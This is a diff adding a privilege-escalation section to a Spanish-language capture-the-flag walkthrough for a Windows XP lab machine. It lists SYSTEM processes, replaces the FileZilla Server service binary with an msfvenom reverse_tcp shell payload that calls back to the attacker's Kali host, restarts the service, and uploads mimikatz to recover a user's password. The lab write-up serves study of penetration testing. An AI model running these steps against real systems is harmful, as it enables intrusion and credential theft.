@@ -248,20 +248,80 @@ root@kali:~# netcat -lvp 5555
 
 ### 4.1. Características actuales de acceso
 
+- El usuario de acceso es: ALEX y pertenece al grupo ADMINISTRATORS
+
+<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream9.jpg" width=80% />
 
 
+### 4.2. Buscar procesos que se ejecutan con privilegios SYSTEM
+
+- Encontramos un SERVICIO DE RED que corra con privilegios de SYSTEM, buscamos su binario y lo reemplazamos con un BINARIO MALICIOSO. Reiniciamos el servicio que se ejecuta como SYSTEM y se ejecuta nuestro binario malicioso (por lo general una conexión reversa).
+
+- Buscamos procesos "NO CONVENCIONALES" que se ejecuten como SYSTEM.
+
+```
+c:\www\root\cgi-bin>tasklist /FI "username eq SYSTEM"
+tasklist /FI "username eq SYSTEM"
+
+Image Name                   PID Session Name     Session#    Mem Usage
+========================= ====== ================ ======== ============
+System Idle Process            0 Console                 0         28 K
+System                         4 Console                 0        556 K
+smss.exe                     592 Console                 0        388 K
+csrss.exe                    656 Console                 0      3,524 K
+winlogon.exe                 680 Console                 0      7,040 K
+services.exe                 724 Console                 0      3,152 K
+lsass.exe                    736 Console                 0      1,532 K
+svchost.exe                  896 Console                 0      4,604 K
+svchost.exe                 1100 Console                 0     16,408 K
+avgchsvx.exe                1160 Console                 0      1,160 K
+avgrsx.exe                  1168 Console                 0        724 K
+avgcsrvx.exe                1564 Console                 0      1,668 K
+spoolsv.exe                 1720 Console                 0      4,412 K
+avgwdsvc.exe                 636 Console                 0      2,684 K
+FileZilla server.exe         856 Console                 0      2,904 K
+FreeSSHDService.exe          980 Console                 0      4,000 K
+OpenTFTPServerMT.exe        1068 Console                 0      1,856 K
+```
+
+<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream10.jpg" width=80% />
 
 
+### 4.3. Reemplazar el binario original que ejecuta el proceso FILEZILLA
 
+```
+* Detenemos el servicio Vulnerable"
+C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP Server"
+net stop "FileZilla Server FTP Server"
+The FileZilla Server FTP server service is stopping.
+The FileZilla Server FTP server service was stopped successfully.
 
+* Hacemos una copia del binario original
+C:\Program Files\FileZilla Server>move "FileZilla server.exe" "FileZilla server.exe.bak"
+move "FileZilla server.exe" "FileZilla server.exe.bak"
 
+* Creamos un payload en KALI LINUX
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.78.131 -a x86 --platform Windows -f exe -o test.exe
 
+* Copiamos el PAYLOAD como si fuera el binario original
+move C:\www\root\test.exe "FileZilla server.exe"
 
+* Levantamos el servicio de nuevo
+net start "FileZilla Server FTP Server"
 
+```
 
+<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream11.jpg" width=80% />
 
+### 4.4. Ejecutamos MIMIKATIZ
 
+- Subimos MIMIKATZ a Windows XP y luego lo ejecutamos.
+- Obtenemos la contraseña del usuario ALEX.
 
+```
+tftp> put mimikatz.exe         
+Sent 1013260 bytes in 1.2 seconds
+```
 
-
+<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream12.jpg" width=80% />
 
